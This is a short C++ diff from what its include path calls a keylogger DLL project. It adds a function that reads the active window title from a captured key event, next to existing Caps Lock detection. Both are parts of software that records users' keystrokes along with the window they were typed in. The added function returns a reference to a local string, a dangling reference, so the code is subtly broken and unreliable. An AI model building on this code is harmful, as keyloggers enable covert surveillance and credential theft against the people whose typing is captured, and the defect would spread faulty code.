@@ -1,5 +1,5 @@
 
-#include			"keylogger_dll\Analyser.h"
+#include "Analyser.h"
 
 Analyser::Analyser()
 {
@@ -13,6 +13,12 @@ Analyser::~Analyser()
 int	 Analyser::isCapsLock() const
 {
 	return (GetKeyState(VK_CAPITAL) & 0x0001);
+}
+
+std::string&		Analyser::getWindowTitle(AEvent* e)
+{
+	std::string		res = e->getContext()._windowTitle;
+	return (res);
 }
 
 std::string&				Analyser::analysis(AEvent* event)
